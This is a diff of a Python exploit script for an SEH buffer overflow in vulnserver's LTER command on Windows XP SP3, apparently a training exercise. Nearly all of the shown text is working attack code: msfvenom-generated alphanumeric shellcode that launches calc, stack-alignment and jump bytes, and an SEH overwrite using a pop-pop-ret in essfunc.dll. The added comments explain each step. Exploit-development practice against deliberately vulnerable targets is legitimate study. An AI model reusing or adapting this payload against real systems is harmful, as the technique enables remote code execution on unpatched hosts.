@@ -8,13 +8,17 @@ target_ip = "X.X.X.X"
 target_port = 9999
 
 def make_string(offset):
+    # Prepend to run LTER command and crash on vulnserver
     prepend = b"LTER /.:/"
     #cmd = "/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l %d" %offset
     #pattern = subprocess.check_output(cmd, shell=True)
-    #NSEH offset is 3495 for windows xp sp3
-    #SEH offset is 3499
+    #NSEH offset is 3495 for Windows XP SP3
+    #SEH offset is 3499 for Windows XP SP 3
+    # pad out the initial buffer because I was too lazy to calculate the exact bytes
     pad = b"\x41"*8
-    buf_prepend = b"\x54\x58\x2D\x7F\x07\x52\x51\x2D\x20\x01\x5E\x5E\x2D\x0C\x01\x50\x50\x50\x5C"
+    # moves the stack to the location our buffer will be at, properly aligned
+    buf_prepend = b"\x54\x58\x2D\x7F\x07\x52\x51\x2D\x20\x01\x5E\x5E\x2D\x0D\x01\x50\x50\x50\x5C"
+    # msfvenom -p windows/exec CMD="calc" -f python EXITFUNC=seh BufferRegister=ESP -e x86/alpha_mixed
     buf =  b""
     buf += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
     buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
@@ -50,12 +54,23 @@ def make_string(offset):
     buf += b"\x57\x42\x33\x44\x32\x70\x6f\x43\x5a\x67\x70\x61\x43"
     buf += b"\x39\x6f\x78\x55\x65\x33\x71\x71\x52\x4c\x50\x63\x73"
     buf += b"\x30\x41\x41"
-    pad2 = b"\x41" * (1000 - len(buf_prepend))
-    stage1 = pad + buf_prepend + pad2 + buf
-    long_jump = b"\x54\x58\x2D\x70\x7F\x7F\x7F\x2D\x04\x60\x7F\x7F\x2D\x04\x0F\x01\x01\x50\x5C\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x7F\x08\x52\x51\x2D\x0F\x02\x5E\x5E\x2D\x0E\x03\x50\x50\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x7F\x7F\x7F\x10\x2D\x20\x30\x30\x03\x2D\x20\x0F\x0F\x03\x50"
+    # padding between the stack adjustment/alignment and the shellcode
+    pad2 = b"\x41" * (1000 - len(buf_prepend) - 1)
+    # combine that all into one variable and make it easier to deal with
+    stage = pad + buf_prepend + pad2 + buf
+    # actually a near jump, jumps back to the beginning of our buffer
+    long_jump = b"\x54\x58\x2D\x70\x7F\x7F\x7F\x2D\x04\x60\x7F\x7F"
+    long_jump += b"\x2D\x04\x0F\x01\x01\x50\x5C\x25\x4A\x4D\x4E\x55"
+    long_jump += b"\x25\x35\x32\x31\x2A\x2D\x7F\x08\x52\x51\x2D\x0F"
+    long_jump += b"\x02\x5E\x5E\x2D\x0E\x03\x50\x50\x50\x25\x4A\x4D"
+    long_jump += b"\x4E\x55\x25\x35\x32\x31\x2A\x2D\x7F\x7F\x7F\x10"
+    long_jump += b"\x2D\x20\x30\x30\x03\x2D\x20\x0F\x0F\x03\x50"
+    # jumps back to take our jump to the beginning of shellcode
     nseh = b"\x42\x77\xff\x42"
+    # pop pop ret located in essfunc.dll
     seh = struct.pack("<I", 0x6250120b)
-    junk = stage1 + b"\x41"*(offset - 125 - len(stage1)) + long_jump + b"\x41" * (125 - len(long_jump))
+    # combine it all with plenty of space for our alpha encoded jump to the beginning of the buffer
+    junk = stage + b"\x41"*(offset - 125 - len(stage)) + long_jump + b"\x41" * (125 - len(long_jump))
     afterjunk = b"D"*100
     attack_string = prepend + junk + nseh + seh + afterjunk
     return attack_string
